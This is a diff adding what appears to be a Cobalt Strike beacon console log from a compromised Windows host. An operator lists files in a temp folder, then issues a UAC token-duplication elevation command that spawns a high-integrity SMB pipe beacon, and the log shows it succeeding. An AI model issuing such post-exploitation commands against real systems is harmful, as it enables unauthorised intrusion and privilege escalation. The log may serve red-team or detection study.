@@ -1,0 +1,22 @@
+12/19 12:37:43 UTC [metadata] 192.168.1.20 <- 192.168.1.20; computer: ACER; user: david; process: mspaint.exe; pid: 3900; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/19 12:38:38 UTC [input] <neo> ls
+12/19 12:38:39 UTC [task] <> Tasked beacon to list files in .
+12/19 12:39:33 UTC [checkin] host called home, sent: 19 bytes
+12/19 12:39:33 UTC [output]
+C:\Users\david\AppData\Local\Temp\RarSFX3\*
+D	0	12/19/2022 19:36:33	.
+D	0	12/19/2022 19:39:27	..
+F	927232	12/15/2022 20:43:09	a.exe
+F	2247	12/15/2022 15:25:31	Google Chrome.lnk
+
+
+12/19 12:44:04 UTC [input] <neo> elevate uac-token-duplication ec2 - smb
+12/19 12:44:04 UTC [task] <T1088, T1093> Tasked beacon to spawn windows/beacon_bind_pipe (\\.\pipe\msagent_9f) in a high integrity process (token duplication)
+12/19 12:44:34 UTC [checkin] host called home, sent: 263915 bytes
+12/19 12:44:35 UTC [output]
+received output:
+[+] Success! Used token from PID 15636
+
+12/19 12:44:35 UTC [output]
+established link to child beacon: 192.168.1.20
+
